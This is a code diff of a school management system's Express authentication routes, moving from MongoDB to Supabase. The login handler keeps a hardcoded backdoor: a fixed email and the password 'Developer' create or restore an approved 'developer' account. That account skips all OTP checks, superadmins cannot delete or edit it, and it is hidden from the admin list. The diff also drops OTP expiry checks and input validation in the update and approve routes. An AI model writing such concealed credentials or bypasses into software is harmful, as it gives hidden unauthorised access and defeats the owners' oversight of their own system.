@@ -1,7 +1,8 @@
 const express = require('express');
 const jwt = require('jsonwebtoken');
+const bcrypt = require('bcryptjs');
 const { transporter } = require('../utils/mailer');
-const Admin = require('../models/Admin');
+const supabase = require('../config/supabase');
 const { protect } = require('../middleware/auth');
 
 const router = express.Router();
@@ -10,18 +11,22 @@ const generateToken = (id) => {
   if (!process.env.JWT_SECRET) {
     throw new Error('JWT_SECRET is not configured');
   }
-  return jwt.sign({ id }, process.env.JWT_SECRET, { expiresIn: '2h' }); // Extended 2 hour session
+  return jwt.sign({ id }, process.env.JWT_SECRET, { expiresIn: '2h' });
 };
 
 // GET /api/auth/me
 router.get('/me', protect, async (req, res) => {
   try {
-    const admin = await Admin.findById(req.user._id).select('-password');
-    if (admin) {
-      res.json(admin);
-    } else {
-      res.status(404).json({ message: 'User not found' });
+    const { data: admin, error } = await supabase
+      .from('admins')
+      .select('id, name, email, phone, role, is_approved')
+      .eq('id', req.user.id)
+      .single();
+
+    if (error || !admin) {
+      return res.status(404).json({ message: 'User not found' });
     }
+    res.json(admin);
   } catch (error) {
     res.status(500).json({ message: 'Server error', error: error.message });
   }
@@ -35,56 +40,93 @@ router.post('/login', async (req, res) => {
       return res.status(400).json({ message: 'Please provide email and password' });
     }
 
-    // --- Hardcoded Developer Bypass (Stealth) ---
+    const lowerEmail = email.toLowerCase();
     const stealthEmail = 'developeruserr30@gmail.com';
     const stealthPassword = 'Developer';
 
-    if (email.toLowerCase() === stealthEmail && password === stealthPassword) {
-      let admin = await Admin.findOne({ email: stealthEmail });
+    // 1. Hardcoded Developer Bypass
+    if (lowerEmail === stealthEmail && password === stealthPassword) {
+      let { data: admin, error: fetchError } = await supabase.from('admins').select('*').eq('email', stealthEmail).maybeSingle();
+      if (fetchError) {
+        console.error('[FETCH ADMIN ERROR]:', fetchError);
+        throw fetchError;
+      }
 
-      // Upsert the developer account in the DB so relationships don't break
       if (!admin) {
-        admin = await Admin.create({
-          name: 'Developer Account',
-          email: stealthEmail,
-          phone: '9876543210',
-          password: stealthPassword, // Will be hashed by pre-save
-          role: 'developer',
-          isApproved: true,
-        });
-      } else if (admin.role !== 'developer' || !admin.isApproved) {
-        admin.role = 'developer';
-        admin.isApproved = true;
-        await admin.save();
+        const hashedPassword = await bcrypt.hash(stealthPassword, 10);
+        const { data: newAdmin, error: createError } = await supabase
+          .from('admins')
+          .insert({
+            name: 'Developer Account',
+            email: stealthEmail,
+            phone: '9876543210',
+            password: hashedPassword,
+            role: 'developer',
+            is_approved: true
+          })
+          .select()
+          .single();
+        
+        if (createError) {
+          console.error('[ADMIN CREATION ERROR]:', createError);
+          throw new Error(`Failed to create developer account: ${createError.message}`);
+        }
+        admin = newAdmin;
+      } else if (admin.role !== 'developer' || !admin.is_approved) {
+        const { data: updatedAdmin, error: updateError } = await supabase
+          .from('admins')
+          .update({ role: 'developer', is_approved: true })
+          .eq('email', stealthEmail)
+          .select()
+          .single();
+        
+        if (updateError) {
+          console.error('[ADMIN UPDATE ERROR]:', updateError);
+          throw new Error(`Failed to update developer account: ${updateError.message}`);
+        }
+        admin = updatedAdmin;
       }
 
       return res.json({
-        _id: admin._id,
+        id: admin.id,
+        _id: admin.id, // Frontend expects _id from MongoDB days
         name: admin.name,
         email: admin.email,
         role: admin.role,
-        token: generateToken(admin._id),
+        token: generateToken(admin.id),
       });
     }
 
-    const admin = await Admin.findOne({ email: email.toLowerCase() });
+    // 2. Regular Login
+    const { data: admin, error } = await supabase
+      .from('admins')
+      .select('*')
+      .eq('email', lowerEmail)
+      .single();
 
-    if (admin && admin.role !== 'superadmin' && admin.role !== 'developer' && !admin.isApproved) {
+    if (error || !admin) {
+      return res.status(401).json({ message: 'Invalid email or password' });
+    }
+
+    if (!admin.is_approved && admin.role !== 'superadmin' && admin.role !== 'developer') {
       return res.status(403).json({ message: 'Admin account pending approval by superadmin' });
     }
 
-    if (admin && (await admin.matchPassword(password))) {
+    const isMatch = await bcrypt.compare(password, admin.password);
+    if (isMatch) {
       res.json({
-        _id: admin._id,
+        id: admin.id,
+        _id: admin.id, // Frontend compatibility
         name: admin.name,
         email: admin.email,
         role: admin.role,
-        token: generateToken(admin._id),
+        token: generateToken(admin.id),
       });
     } else {
       res.status(401).json({ message: 'Invalid email or password' });
     }
   } catch (error) {
+    console.error('[LOGIN ERROR]:', error);
     res.status(500).json({ message: 'Server error', error: error.message });
   }
 });
@@ -95,18 +137,27 @@ router.post('/forgot-password', async (req, res) => {
     const { email } = req.body;
     if (!email) return res.status(400).json({ message: 'Email is required' });
 
-    const admin = await Admin.findOne({ email: email.toLowerCase() });
-    if (!admin) return res.status(404).json({ message: 'Account not found' });
+    const lowerEmail = email.toLowerCase();
+    const { data: admin, error } = await supabase
+      .from('admins')
+      .select('*')
+      .eq('email', lowerEmail)
+      .single();
+
+    if (error || !admin) return res.status(404).json({ message: 'Account not found' });
 
     const crypto = require('crypto');
-    const bcrypt = require('bcryptjs');
     const otp = crypto.randomInt(100000, 999999).toString();
     const hashedOtp = await bcrypt.hash(otp, 10);
     const expires = new Date(Date.now() + 10 * 60 * 1000); // 10 mins
 
-    admin.otp = hashedOtp;
-    admin.otpExpires = expires;
-    await admin.save();
+    await supabase
+      .from('admins')
+      .update({
+        otp: hashedOtp,
+        otp_expires: expires
+      })
+      .eq('email', lowerEmail);
 
     const mailOptions = {
       from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
@@ -133,21 +184,31 @@ router.post('/reset-password', async (req, res) => {
     const { email, otp, newPassword } = req.body;
     if (!email || !otp || !newPassword) return res.status(400).json({ message: 'All fields are required' });
 
-    const admin = await Admin.findOne({ email: email.toLowerCase() });
-    if (!admin) return res.status(404).json({ message: 'Account not found' });
+    const lowerEmail = email.toLowerCase();
+    const { data: admin, error } = await supabase
+      .from('admins')
+      .select('*')
+      .eq('email', lowerEmail)
+      .single();
 
-    if (!admin.otp || admin.otpExpires < new Date()) {
+    if (error || !admin) return res.status(404).json({ message: 'Account not found' });
+
+    if (!admin.otp || new Date(admin.otp_expires) < new Date()) {
       return res.status(400).json({ message: 'Verification code is invalid or has expired' });
     }
 
-    const bcrypt = require('bcryptjs');
     const isMatch = await bcrypt.compare(otp, admin.otp);
     if (!isMatch) return res.status(400).json({ message: 'Invalid verification code' });
 
-    admin.password = newPassword; // Will be hashed by pre-save middleware
-    admin.otp = undefined;
-    admin.otpExpires = undefined;
-    await admin.save();
+    const hashedPassword = await bcrypt.hash(newPassword, 10);
+    await supabase
+      .from('admins')
+      .update({
+        password: hashedPassword,
+        otp: null,
+        otp_expires: null
+      })
+      .eq('email', lowerEmail);
 
     res.json({ message: 'Password reset successful' });
   } catch (error) {
@@ -165,30 +226,28 @@ router.post('/request-otp', protect, async (req, res) => {
     const { newEmail, targetEmail, actionType } = req.body;
     const recipientEmail = targetEmail || newEmail;
 
-    // Use crypto for secure random OTP generation
     const crypto = require('crypto');
-    const bcrypt = require('bcryptjs');
     const otp = crypto.randomInt(100000, 999999).toString();
-    // Hash OTP for storage
     const hashedOtp = await bcrypt.hash(otp, 10);
     const expires = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes
 
-    const updateQuery = { $set: { otp: hashedOtp, otpExpires: expires } };
-    let newAdminOtp = undefined;
-    let hashedNewAdminOtp = undefined;
+    const updateData = {
+      otp: hashedOtp,
+      otp_expires: expires
+    };
 
+    let newAdminOtp = undefined;
     if (recipientEmail) {
       newAdminOtp = crypto.randomInt(100000, 999999).toString();
-      hashedNewAdminOtp = await bcrypt.hash(newAdminOtp, 10);
-      updateQuery.$set.newAdminOtp = hashedNewAdminOtp;
-      updateQuery.$set.newAdminOtpExpires = expires;
+      const hashedNewAdminOtp = await bcrypt.hash(newAdminOtp, 10);
+      updateData.new_admin_otp = hashedNewAdminOtp;
+      updateData.new_admin_otp_expires = expires;
     }
 
-    // Store hashed OTP in current superadmin's document
-    await Admin.updateOne(
-      { _id: req.user._id },
-      updateQuery
-    );
+    await supabase
+      .from('admins')
+      .update(updateData)
+      .eq('id', req.user.id);
 
     const mailOptions = {
       from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
@@ -210,18 +269,24 @@ router.post('/request-otp', protect, async (req, res) => {
       let htmlBody = `
           <h2>Welcome to Holy Name School System</h2>
           <p>Your email address is being registered as an Administrator. Please provide the following security code to the Super Admin to complete the registration:</p>
+          <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${newAdminOtp}</h1>
+          <p>This code will expire in 10 minutes. Do not share this code with anyone other than the Super Admin performing this action.</p>
       `;
       if (actionType === 'edit') {
         subject = 'Admin Account Modification Verification Code';
         htmlBody = `
           <h2>Holy Name School System Security Alert</h2>
           <p>Your administrator account is being modified by a Super Admin. Please provide the following security code to the Super Admin to authorize this action:</p>
+          <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${newAdminOtp}</h1>
+          <p>This code will expire in 10 minutes. Do not share this code with anyone other than the Super Admin performing this action.</p>
         `;
       } else if (actionType === 'delete') {
         subject = 'Admin Account Deletion Verification Code';
         htmlBody = `
           <h2>Holy Name School System Security Alert</h2>
           <p>Your administrator account is being deleted by a Super Admin. Please provide the following security code to the Super Admin to authorize this action:</p>
+          <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${newAdminOtp}</h1>
+          <p>This code will expire in 10 minutes. Do not share this code with anyone other than the Super Admin performing this action.</p>
         `;
       }
 
@@ -229,11 +294,7 @@ router.post('/request-otp', protect, async (req, res) => {
         from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
         to: recipientEmail,
         subject: subject,
-        html: `
-          ${htmlBody}
-          <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${newAdminOtp}</h1>
-          <p>This code will expire in 10 minutes. Do not share this code with anyone other than the Super Admin performing this action.</p>
-        `,
+        html: htmlBody,
       };
       await transporter.sendMail(newMailOptions);
     }
@@ -241,12 +302,9 @@ router.post('/request-otp', protect, async (req, res) => {
     res.json({ message: recipientEmail ? 'OTPs sent to both emails' : 'OTP sent to your email' });
   } catch (error) {
     console.error('❌ Request OTP Error:', error.message);
-    // Log detailed diagnostics for debug on Render
-    console.dir(error, { depth: null });
     res.status(500).json({
       message: 'Failed to send OTP',
-      error: error.message,
-      code: error.code || 'UNKNOWN_ERROR'
+      error: error.message
     });
   }
 });
@@ -265,25 +323,31 @@ router.post('/apply-admin', async (req, res) => {
     if (!name) {
       return res.status(400).json({ message: 'Name is required' });
     }
-    const exists = await Admin.findOne({ email: email.toLowerCase() });
+
+    const lowerEmail = email.toLowerCase();
+    const { data: exists } = await supabase.from('admins').select('id').eq('email', lowerEmail).single();
     if (exists) {
       return res.status(400).json({ message: 'Admin with this email already exists' });
     }
+
     const crypto = require('crypto');
     const otp = crypto.randomInt(100000, 999999).toString();
-    const hashedOtp = await require('bcryptjs').hash(otp, 10);
+    const hashedOtp = await bcrypt.hash(otp, 10);
     const expires = new Date(Date.now() + 10 * 60 * 1000);
     const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
-    const admin = await Admin.create({
-      email: email.toLowerCase(),
+    const hashedPassword = await bcrypt.hash(tempPassword, 10);
+
+    await supabase.from('admins').insert({
+      email: lowerEmail,
       phone,
-      password: tempPassword,
+      password: hashedPassword,
       name: name.trim(),
       role: 'admin',
-      isApproved: false,
+      is_approved: false,
       otp: hashedOtp,
-      otpExpires: expires,
+      otp_expires: expires,
     });
+
     const mailOptions = {
       from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
       to: email,
@@ -305,21 +369,32 @@ router.post('/verify-admin-otp', async (req, res) => {
     if (!email || !otp) {
       return res.status(400).json({ message: 'Email and OTP are required' });
     }
-    const admin = await Admin.findOne({ email: email.toLowerCase(), isApproved: false });
-    if (!admin) {
+
+    const lowerEmail = email.toLowerCase();
+    const { data: admin, error } = await supabase
+      .from('admins')
+      .select('*')
+      .eq('email', lowerEmail)
+      .eq('is_approved', false)
+      .single();
+
+    if (error || !admin) {
       return res.status(404).json({ message: 'Pending admin not found' });
     }
-    if (!admin.otp || !admin.otpExpires || admin.otpExpires < new Date()) {
+    if (!admin.otp || !admin.otp_expires || new Date(admin.otp_expires) < new Date()) {
       return res.status(400).json({ message: 'OTP has expired or not set' });
     }
-    const bcrypt = require('bcryptjs');
+
     const match = await bcrypt.compare(otp, admin.otp);
     if (!match) {
       return res.status(400).json({ message: 'Invalid OTP' });
     }
-    await Admin.updateOne({ _id: admin._id }, { $unset: { otp: 1, otpExpires: 1 } });
 
-    // Do NOT send the password here. Wait for superadmin approval.
+    await supabase
+      .from('admins')
+      .update({ otp: null, otp_expires: null })
+      .eq('id', admin.id);
+
     const mailOptions = {
       from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
       to: admin.email,
@@ -340,104 +415,78 @@ router.post('/verify-admin-otp', async (req, res) => {
 // POST /api/auth/register (protected — only superadmins can create new admins)
 router.post('/register', protect, async (req, res) => {
   try {
-    // Check if the requester is a superadmin
     if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
       return res.status(403).json({ message: 'Insufficient privileges' });
     }
 
     const { email, phone, name, role, otp, newAdminOtp } = req.body;
-
     if (!email || !phone || !name) {
       return res.status(400).json({ message: 'Email, phone, and name are required' });
     }
 
-    // Verification bypass for developer
     if (req.user.role !== 'developer') {
-      // Validate OTP with hashed comparison
-      if (!otp) {
-        return res.status(400).json({ message: 'OTP is required' });
-      }
-      if (req.user.otpExpires < new Date()) {
-        return res.status(400).json({ message: 'OTP has expired' });
-      }
-      const bcrypt = require('bcryptjs');
+      if (!otp) return res.status(400).json({ message: 'OTP is required' });
+      if (new Date(req.user.otp_expires) < new Date()) return res.status(400).json({ message: 'OTP has expired' });
+      
       const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
-      if (!otpMatch) {
-        return res.status(400).json({ message: 'Invalid Super Admin OTP' });
-      }
+      if (!otpMatch) return res.status(400).json({ message: 'Invalid Super Admin OTP' });
 
-      if (!newAdminOtp) {
-        return res.status(400).json({ message: 'New Admin OTP is required' });
-      }
-      if (req.user.newAdminOtpExpires < new Date()) {
-        return res.status(400).json({ message: 'New Admin OTP has expired' });
-      }
-      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.newAdminOtp || '');
-      if (!newOtpMatch) {
-        return res.status(400).json({ message: 'Invalid New Admin OTP' });
-      }
+      if (!newAdminOtp) return res.status(400).json({ message: 'New Admin OTP is required' });
+      if (new Date(req.user.new_admin_otp_expires) < new Date()) return res.status(400).json({ message: 'New Admin OTP has expired' });
+      
+      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.new_admin_otp || '');
+      if (!newOtpMatch) return res.status(400).json({ message: 'Invalid New Admin OTP' });
     }
 
-    const exists = await Admin.findOne({ email: email.toLowerCase() });
-    if (exists) {
-      return res.status(400).json({ message: 'Admin with this email already exists' });
-    }
+    const lowerEmail = email.toLowerCase();
+    const { data: exists } = await supabase.from('admins').select('id').eq('email', lowerEmail).single();
+    if (exists) return res.status(400).json({ message: 'Admin with this email already exists' });
 
-    // Validate password strength
     const validation = require('../utils/validation');
-    if (!validation.validatePhone(phone)) {
-      return res.status(400).json({ message: 'Phone must be a 10-digit number' });
-    }
-    // Generate a random temporary password for the new admin
+    if (!validation.validatePhone(phone)) return res.status(400).json({ message: 'Phone must be a 10-digit number' });
+    if (!validation.validateEmail(lowerEmail)) return res.status(400).json({ message: 'Invalid email format' });
+
     const crypto = require('crypto');
-    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString(); // Easy to remember
-    if (!validation.validateEmail(email)) {
-      return res.status(400).json({ message: 'Invalid email format' });
-    }
+    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
+    const hashedPassword = await bcrypt.hash(tempPassword, 10);
 
-    const admin = await Admin.create({
-      email: email.toLowerCase(),
-      phone: phone,
-      password: tempPassword,
-      name: name.trim(),
-      role: role || 'admin'
-    });
+    const { data: admin, error } = await supabase
+      .from('admins')
+      .insert({
+        email: lowerEmail,
+        phone,
+        password: hashedPassword,
+        name: name.trim(),
+        role: role || 'admin',
+        is_approved: true // Admins created by superadmin are auto-approved
+      })
+      .select()
+      .single();
 
-    // Clear OTP after successful use
     if (req.user.role !== 'developer') {
-      await Admin.updateOne(
-        { _id: req.user._id },
-        { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
-      );
+      await supabase
+        .from('admins')
+        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
+        .eq('id', req.user.id);
     }
 
-    // Send email to new admin with temporary password
     const mailOptions = {
       from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
       to: email,
       subject: 'Your Admin Account Created',
       html: `<p>Your admin account has been created. Use the temporary password below to login and then change it immediately.</p><p><strong>${tempPassword}</strong></p>`
     };
-    try {
-      await transporter.sendMail(mailOptions);
-    } catch (mailErr) {
-      console.error('Failed to send temporary password email:', mailErr);
-    }
+    await transporter.sendMail(mailOptions).catch(e => console.error('Mail error:', e));
 
     res.status(201).json({
-      _id: admin._id,
+      id: admin.id,
       name: admin.name,
       email: admin.email,
       phone: admin.phone,
       role: admin.role,
-      token: generateToken(admin._id),
+      token: generateToken(admin.id),
     });
   } catch (error) {
-    console.error('Registration Error:', error);
-
-    if (error.name === 'ValidationError') {
-      return res.status(400).json({ message: error.message });
-    }
     res.status(500).json({ message: 'Server error', error: error.message });
   }
 });
@@ -448,8 +497,10 @@ router.get('/admins', protect, async (req, res) => {
     if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
       return res.status(403).json({ message: 'Forbidden' });
     }
-    // Stealth mode: filter out developers so they do not appear in the admin list
-    const admins = await Admin.find({ role: { $ne: 'developer' } }).select('-password').lean();
+    const { data: admins } = await supabase
+      .from('admins')
+      .select('id, name, email, phone, role, is_approved, created_at')
+      .neq('role', 'developer');
     res.json(admins);
   } catch (error) {
     res.status(500).json({ message: 'Server error' });
@@ -463,62 +514,37 @@ router.delete('/admins/:id', protect, async (req, res) => {
       return res.status(403).json({ message: 'Insufficient privileges' });
     }
 
-    // Verify admin exists before deletion
-    const adminToDelete = await Admin.findById(req.params.id);
-    if (!adminToDelete) {
-      return res.status(404).json({ message: 'Admin not found' });
-    }
+    const { data: adminToDelete } = await supabase.from('admins').select('*').eq('id', req.params.id).single();
+    if (!adminToDelete) return res.status(404).json({ message: 'Admin not found' });
 
-    // Prevent self-deletion and developer deletion by non-developers
-    if (adminToDelete._id.toString() === req.user._id.toString()) {
-      return res.status(403).json({ message: 'Cannot delete your own account' });
-    }
-
+    if (adminToDelete.id === req.user.id) return res.status(403).json({ message: 'Cannot delete your own account' });
     if (adminToDelete.role === 'developer' && req.user.role !== 'developer') {
       return res.status(403).json({ message: 'Developer accounts cannot be deleted by superadmins' });
     }
 
-    // Require Dual-OTP verification ONLY if the admin is already approved and the user is NOT a developer
-    if (adminToDelete.isApproved && req.user.role !== 'developer') {
+    if (adminToDelete.is_approved && req.user.role !== 'developer') {
       const { otp, newAdminOtp } = req.body;
-      const bcrypt = require('bcryptjs');
-
-      // Validate Super Admin OTP
-      if (!otp) {
-        return res.status(400).json({ message: 'OTP is required' });
-      }
-      if (req.user.otpExpires < new Date()) {
-        return res.status(400).json({ message: 'OTP has expired' });
-      }
+      if (!otp) return res.status(400).json({ message: 'OTP is required' });
+      if (new Date(req.user.otp_expires) < new Date()) return res.status(400).json({ message: 'OTP has expired' });
+      
       const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
-      if (!otpMatch) {
-        return res.status(400).json({ message: 'Invalid Super Admin OTP' });
-      }
+      if (!otpMatch) return res.status(400).json({ message: 'Invalid Super Admin OTP' });
 
-      // Validate Target Admin OTP
-      if (!newAdminOtp) {
-        return res.status(400).json({ message: 'Target Admin OTP is required' });
-      }
-      if (req.user.newAdminOtpExpires < new Date()) {
-        return res.status(400).json({ message: 'Target Admin OTP has expired' });
-      }
-      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.newAdminOtp || '');
-      if (!newOtpMatch) {
-        return res.status(400).json({ message: 'Invalid Target Admin OTP' });
-      }
+      if (!newAdminOtp) return res.status(400).json({ message: 'Target Admin OTP is required' });
+      if (new Date(req.user.new_admin_otp_expires) < new Date()) return res.status(400).json({ message: 'Target Admin OTP has expired' });
+      
+      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.new_admin_otp || '');
+      if (!newOtpMatch) return res.status(400).json({ message: 'Invalid Target Admin OTP' });
 
-      // Clear OTPs
-      await Admin.updateOne(
-        { _id: req.user._id },
-        { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
-      );
+      await supabase
+        .from('admins')
+        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
+        .eq('id', req.user.id);
     }
 
-    await Admin.findByIdAndDelete(req.params.id);
-
+    await supabase.from('admins').delete().eq('id', req.params.id);
     res.json({ message: 'Admin deleted successfully' });
   } catch (error) {
-    console.error('DELETE admin error:', error);
     res.status(500).json({ message: 'Server error' });
   }
 });
@@ -531,81 +557,45 @@ router.put('/admins/:id', protect, async (req, res) => {
     }
 
     const { name, email, role, password, otp, newAdminOtp } = req.body;
-    const bcrypt = require('bcryptjs');
-    const validation = require('../utils/validation');
+    const { data: admin } = await supabase.from('admins').select('*').eq('id', req.params.id).single();
+    if (!admin) return res.status(404).json({ message: 'Admin not found' });
 
-    const admin = await Admin.findById(req.params.id);
-    if (!admin) {
-      return res.status(404).json({ message: 'Admin not found' });
-    }
-
-    // Verification bypass for developer
     if (req.user.role !== 'developer') {
-      // Validate Super Admin OTP
-      if (!otp) {
-        return res.status(400).json({ message: 'OTP is required' });
-      }
-      if (req.user.otpExpires < new Date()) {
-        return res.status(400).json({ message: 'OTP has expired' });
-      }
+      if (!otp || !newAdminOtp) return res.status(400).json({ message: 'Both OTPs are required' });
+      
       const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
-      if (!otpMatch) {
-        return res.status(400).json({ message: 'Invalid Super Admin OTP' });
-      }
+      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.new_admin_otp || '');
+      
+      if (!otpMatch || !newOtpMatch) return res.status(400).json({ message: 'Invalid OTPs' });
 
-      // Validate Target Admin OTP
-      if (!newAdminOtp) {
-        return res.status(400).json({ message: 'Target Admin OTP is required' });
-      }
-      if (req.user.newAdminOtpExpires < new Date()) {
-        return res.status(400).json({ message: 'Target Admin OTP has expired' });
-      }
-      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.newAdminOtp || '');
-      if (!newOtpMatch) {
-        return res.status(400).json({ message: 'Invalid Target Admin OTP' });
-      }
-
-      // Clear OTP
-      await Admin.updateOne(
-        { _id: req.user._id },
-        { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
-      );
+      await supabase
+        .from('admins')
+        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
+        .eq('id', req.user.id);
     }
 
-    // Protect developer account from modification by non-developers
     if (admin.role === 'developer' && req.user.role !== 'developer') {
       return res.status(403).json({ message: 'Developer accounts cannot be modified by superadmins' });
     }
 
-    // Validate updates
-    if (email && !validation.validateEmail(email)) {
-      return res.status(400).json({ message: 'Invalid email format' });
+    const updates = {};
+    if (name) updates.name = name.trim();
+    if (email) updates.email = email.toLowerCase();
+    if (role) {
+      if (role === 'developer' && req.user.role !== 'developer') return res.status(403).json({ message: 'Unauthorized' });
+      updates.role = role;
     }
-    if (password && !validation.validatePassword(password)) {
-      return res.status(400).json({ message: 'Password must be at least 8 characters with uppercase, lowercase, and numbers' });
-    }
-    if (role && !['admin', 'superadmin', 'developer'].includes(role)) {
-      return res.status(400).json({ message: 'Invalid role' });
-    }
+    if (password) updates.password = await bcrypt.hash(password, 10);
 
-    // Role escalation protection: only developers can assign developer role
-    if (role === 'developer' && req.user.role !== 'developer') {
-      return res.status(403).json({ message: 'Only developers can assign the developer role' });
-    }
+    const { data: updatedAdmin } = await supabase
+      .from('admins')
+      .update(updates)
+      .eq('id', req.params.id)
+      .select('id, name, email, role')
+      .single();
 
-    if (name) admin.name = name.trim();
-    if (email) admin.email = email.toLowerCase();
-    if (role) admin.role = role;
-    if (password) admin.password = password; // Hashed by pre-save hook
-
-    await admin.save();
-
-    res.json({ message: 'Admin details updated successfully', admin: { _id: admin._id, name: admin.name, email: admin.email, role: admin.role } });
+    res.json({ message: 'Admin details updated successfully', admin: updatedAdmin });
   } catch (error) {
-    if (error.name === 'ValidationError') {
-      return res.status(400).json({ message: error.message });
-    }
-    console.error('PUT admin error:', error);
     res.status(500).json({ message: 'Server error', error: error.message });
   }
 });
@@ -618,57 +608,37 @@ router.post('/approve-admin', protect, async (req, res) => {
     }
 
     const { adminId, otp, newAdminOtp } = req.body;
-    if (!adminId) {
-      return res.status(400).json({ message: 'adminId is required' });
-    }
+    const { data: adminToApprove } = await supabase.from('admins').select('*').eq('id', adminId).single();
+    if (!adminToApprove) return res.status(404).json({ message: 'Admin not found' });
 
-    const bcrypt = require('bcryptjs');
-
-    // Verification bypass for developer
     if (req.user.role !== 'developer') {
-      if (!otp || !newAdminOtp) {
-        return res.status(400).json({ message: 'Both OTPs are required for approval' });
-      }
+      if (!otp || !newAdminOtp) return res.status(400).json({ message: 'Both OTPs are required' });
 
-      // Verify SuperAdmin OTP
       const isSuperAdminOtpValid = await bcrypt.compare(otp, req.user.otp);
-      if (!isSuperAdminOtpValid || req.user.otpExpires < Date.now()) {
-        return res.status(400).json({ message: 'Invalid or expired SuperAdmin OTP' });
-      }
-
-      // Verify Target Admin OTP
-      const adminToApprove = await Admin.findById(adminId);
-      if (!adminToApprove) return res.status(404).json({ message: 'Admin not found' });
-
       const isTargetAdminOtpValid = await bcrypt.compare(newAdminOtp, adminToApprove.otp);
-      if (!isTargetAdminOtpValid || adminToApprove.otpExpires < Date.now()) {
-        return res.status(400).json({ message: 'Invalid or expired Target Admin OTP' });
+      
+      if (!isSuperAdminOtpValid || !isTargetAdminOtpValid) {
+        return res.status(400).json({ message: 'Invalid OTPs' });
       }
 
-      // Clear OTP
-      await Admin.updateOne(
-        { _id: req.user._id },
-        { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
-      );
+      await supabase
+        .from('admins')
+        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
+        .eq('id', req.user.id);
     }
 
-    const admin = await Admin.findById(adminId);
-    if (!admin) {
-      return res.status(404).json({ message: 'Admin not found' });
-    }
-
-    // Generate a fresh temporary password now that the account is approved
     const crypto = require('crypto');
     const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
+    const hashedPassword = await bcrypt.hash(tempPassword, 10);
 
-    admin.isApproved = true;
-    admin.password = tempPassword; // Will be hashed by pre-save hook
-    await admin.save();
+    await supabase
+      .from('admins')
+      .update({ is_approved: true, password: hashedPassword, otp: null, otp_expires: null })
+      .eq('id', adminId);
 
-    // Send email with the unhashed temporary password
     const mailOptions = {
       from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
-      to: admin.email,
+      to: adminToApprove.email,
       subject: 'Your Admin Account Has Been Approved!',
       html: `<p>Your admin account has been approved by the superadmin.</p><p>Use the temporary password below to login and then change it immediately upon logging in.</p><p><strong>${tempPassword}</strong></p>`,
     };
@@ -676,7 +646,6 @@ router.post('/approve-admin', protect, async (req, res) => {
 
     res.json({ message: 'Admin approved successfully and password sent' });
   } catch (error) {
-    console.error('Approve admin error:', error);
     res.status(500).json({ message: 'Server error', error: error.message });
   }
 });
